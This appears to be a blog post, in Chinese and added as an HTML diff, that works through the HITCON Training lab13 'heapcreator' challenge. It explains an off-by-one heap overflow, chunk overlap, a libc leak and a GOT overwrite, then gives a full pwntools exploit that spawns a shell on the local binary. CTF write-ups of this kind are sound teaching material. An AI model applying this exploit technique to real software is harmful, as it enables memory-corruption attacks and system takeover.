@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html lang="en">
+	<head>
+		<meta charset="utf-8">
+		<meta http-equiv="X-UA-Compatible" content="IE=edge">
+		<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+		
+		<title>chunk extend - Yuuoniy&#39;s blog</title>
+		
+		<meta name="description" content="题目：
+HITCON Trainging lab13
+程序分析：
+create : 长度没有进行检测，如果为负数，会导致任意长度堆溢出漏洞
+edit :存在 off-by-one 漏洞
+利用思路
+ 利用 Off-by-one 漏洞覆盖下一个 chunk 的 size 字段 申请伪造的chunk大小，造成 overlapping, 修改关键指针  要注意因为 chunk0 大小是 0x18，会用到 chunk1 的 pre_size 部分。
+然后溢出的时候刚好可以覆盖到 nextchunk 的 size 部分。
+然后堆布局基本是这样的：
+chunk1 info(0x20) | chunk1 | chunk2 info | chunk2
+所以我们 chunk1 溢出修改的是 chunk2 info 的 size, 然后这个 chunk 就会覆盖到 chunk2 的信息，
+从而我们可以修改 chunk2 信息，可以用来 leak info, 修改 got 表。
+内存变化
+这个覆盖了 size 后的 layout">
+		<meta name="author" content="">
+		<meta name="generator" content="hugo-plains https://gitlab.com/hugo-plains/hugo-plains">
+		
+		<link href="https://blog.yuuoniy.cn/an-old-hope.min.css" rel="stylesheet">
+		<link href="https://blog.yuuoniy.cn/style.css" rel="stylesheet">
+		<link href="https://blog.yuuoniy.cn/custom.css" rel="stylesheet">
+		
+		<link rel="apple-touch-icon" href="https://blog.yuuoniy.cn/apple-touch-icon.png">
+		<link rel="icon" href="https://blog.yuuoniy.cn/favicon.ico">
+		<meta name="generator" content="Hugo 0.76.5" />
+		
+		
+		
+		<script>
+			function setTheme() {
+				if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+					document.body.classList.add('dark');
+					return;
+				}
+				
+				let date = new Date();
+				let time = date.getTime();
+				let sunrise = date.setHours(7, 00); 
+				let sunset = date.setHours(20, 00); 
+
+				if (time < sunrise || time > sunset)
+					document.body.classList.add('dark');
+			}
+		</script>
+		
+	</head>
+	<body class="single">
+		
+		<script>
+			setTheme();
+			console.log("This site was made using Hugo and Plains. https://gohugo.io https://gitlab.com/hugo-plains/hugo-plains");
+		</script>
+		
+		<header class="header">
+			<nav class="nav">
+				<p class="logo"><a href="https://blog.yuuoniy.cn">Yuuoniy&#39;s blog</a></p>
+				<ul class="menu">
+					<li>
+						<a href="/posts/">Posts</a>
+					</li>
+					<li>
+						<a href="/tags/">Tags</a>
+					</li>
+					<li>
+						<a href="/about/">About</a>
+					</li>
+				</ul>
+			</nav>
+		</header>
+		<main class="main">
+
+
+<article class="post-single">
+	<header class="post-header">
+		<h1 class="post-title">chunk extend</h1>
+		<div class="post-meta">September 21, 2019</div>
+	</header>
+	<div class="post-content"><p>题目：</p>
+<p>HITCON Trainging lab13</p>
+<p>程序分析：</p>
+<p>create : 长度没有进行检测，如果为负数，会导致任意长度堆溢出漏洞</p>
+<p>edit :存在 off-by-one 漏洞</p>
+<p>利用思路</p>
+<ul>
+<li>利用 Off-by-one 漏洞覆盖下一个 chunk 的 size 字段</li>
+<li>申请伪造的chunk大小，造成 overlapping, 修改关键指针</li>
+</ul>
+<p>要注意因为 chunk0 大小是 0x18，会用到 chunk1 的 pre_size 部分。</p>
+<p>然后溢出的时候刚好可以覆盖到 nextchunk 的 size 部分。</p>
+<p>然后堆布局基本是这样的：</p>
+<p>chunk1 info(0x20) | chunk1 | chunk2 info | chunk2</p>
+<p>所以我们 chunk1 溢出修改的是 chunk2 info 的 size, 然后这个 chunk 就会覆盖到 chunk2 的信息，</p>
+<p>从而我们可以修改 chunk2 信息，可以用来 leak info, 修改 got 表。</p>
+<p>内存变化</p>
+<p>这个覆盖了 size 后的 layout</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">gef<span style="color:#960050;background-color:#1e0010">➤</span>  x<span style="color:#f92672">/</span><span style="color:#ae81ff">16</span>gx <span style="color:#ae81ff">0xb3c010</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0x10</span>
+<span style="color:#ae81ff">0xb3c000</span>:	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000021</span>
+<span style="color:#ae81ff">0xb3c010</span>:	<span style="color:#ae81ff">0x0000000000000018</span>	<span style="color:#ae81ff">0x0000000000b3c030</span>
+<span style="color:#ae81ff">0xb3c020</span>:	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000021</span>
+<span style="color:#ae81ff">0xb3c030</span>:	<span style="color:#ae81ff">0x0068732f6e69622f</span>	<span style="color:#ae81ff">0x6161616161616161</span>
+<span style="color:#ae81ff">0xb3c040</span>:	<span style="color:#ae81ff">0x6161616161616161</span>	<span style="color:#ae81ff">0x0000000000000041</span>
+<span style="color:#ae81ff">0xb3c050</span>:	<span style="color:#ae81ff">0x0000000000000010</span>	<span style="color:#ae81ff">0x0000000000b3c070</span>
+<span style="color:#ae81ff">0xb3c060</span>:	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000021</span>
+<span style="color:#ae81ff">0xb3c070</span>:	<span style="color:#ae81ff">0x0000000a62626262</span>	<span style="color:#ae81ff">0x0000000000000000</span>
+</code></pre></div><p>然后我们 delete 1, 根据程序分析，会 free 掉 chunk1 info 和 chunk1 这两个堆块。</p>
+<p>然后我们再 malloc 一个 0x30 的 chunk。</p>
+<p>这时候会 malloc 一个 0x20 的 info chunk，然后malloc 一个 0x40 的实际 chunk.</p>
+<p>自己画下图就明白内存的关系, 0x40 的 chunkA 包含了 0x20 的 info chunkB, 这样我们写 chunkA 时，就可以构造 chunkB 的数据，也就是 size 和 Ptr 的数据。这里我们将 ptr 改成了 free 函数的 got 地址。size 是 0x30 不变的。这样show的时候就可以泄露地址了，再改写 free 的 got 表为 system， 最后成功 getshell。</p>
+<p>这道题主要是要搞清楚 chunk 和 info chunk，在堆中实际的 layout。最终就改写了指向 chunk 的 Ptr，利用 show 和 delete 函数，达到 leak info 和 getshell 的目的。</p>
+<p>最终 exp</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+r <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./heapcreator&#39;</span>)
+heap <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./heapcreator&#39;</span>)
+libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./libc.so.6&#39;</span>)
+
+context_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;debug&#39;</span>
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">create</span>(size, content):
+    r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;:&#34;</span>)
+    r<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;1&#34;</span>)
+    r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;:&#34;</span>)
+    r<span style="color:#f92672">.</span>sendline(str(size))
+    r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;:&#34;</span>)
+    r<span style="color:#f92672">.</span>sendline(content)
+
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">edit</span>(idx, content):
+    r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;:&#34;</span>)
+    r<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;2&#34;</span>)
+    r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;:&#34;</span>)
+    r<span style="color:#f92672">.</span>sendline(str(idx))
+    r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;:&#34;</span>)
+    r<span style="color:#f92672">.</span>sendline(content)
+
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">show</span>(idx):
+    r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;:&#34;</span>)
+    r<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;3&#34;</span>)
+    r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;:&#34;</span>)
+    r<span style="color:#f92672">.</span>sendline(str(idx))
+
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">delete</span>(idx):
+    r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;:&#34;</span>)
+    r<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;4&#34;</span>)
+    r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;:&#34;</span>)
+    r<span style="color:#f92672">.</span>sendline(str(idx))
+
+
+<span style="color:#75715e">#gdb.attach(r)</span>
+create(<span style="color:#ae81ff">0x18</span>,<span style="color:#e6db74">&#39;aaaa&#39;</span>)
+create(<span style="color:#ae81ff">0x10</span>,<span style="color:#e6db74">&#39;bbbb&#39;</span>)
+
+edit(<span style="color:#ae81ff">0</span>,<span style="color:#e6db74">&#39;/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x10</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x41</span><span style="color:#e6db74">&#34;</span>)
+delete(<span style="color:#ae81ff">1</span>)
+create(<span style="color:#ae81ff">0x30</span>, p64(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x30</span>) <span style="color:#f92672">+</span> p64(heap<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#39;free&#39;</span>]))  <span style="color:#75715e">#1</span>
+show(<span style="color:#ae81ff">1</span>)
+
+r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;Content : &#34;</span>)
+data <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;Done !&#34;</span>)
+
+free_addr <span style="color:#f92672">=</span> u64(data<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>))
+log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">&#39;free base addr: &#39;</span> <span style="color:#f92672">+</span> hex(free_addr))
+libc_base <span style="color:#f92672">=</span> free_addr <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;free&#39;</span>]
+log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">&#39;libc base addr: &#39;</span> <span style="color:#f92672">+</span> hex(libc_base))
+gdb<span style="color:#f92672">.</span>attach(r)
+system_addr <span style="color:#f92672">=</span> libc_base <span style="color:#f92672">+</span> libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;system&#39;</span>]
+<span style="color:#75715e">#raw_input(&#39;1&#39;)                                                                    </span>
+
+edit(<span style="color:#ae81ff">1</span>, p64(system_addr))
+
+<span style="color:#75715e"># trigger system(&#34;/bin/sh&#34;)</span>
+delete(<span style="color:#ae81ff">0</span>)
+r<span style="color:#f92672">.</span>interactive()
+
+</code></pre></div></div>
+	
+</article></main>
+<footer class="footer">
+	<span>
+		Copyright © 2020–2020, Yuuoniy and the Hugo Authors; all rights reserved.
+		
+	</span>
+	<span>&middot;</span>
+	<span>Powered by <a href="https://gohugo.io/" rel="noopener" target="_blank">Hugo️️</a>️ and <a href="https://gitlab.com/hugo-plains/hugo-plains" rel="noopener" target="_blank">Plains</a></span>
+</footer>
+<script src="https://blog.yuuoniy.cn/highlight.min.js"></script>
+<script>
+	hljs.initHighlightingOnLoad();
+</script>
+</body>
+</html>
+
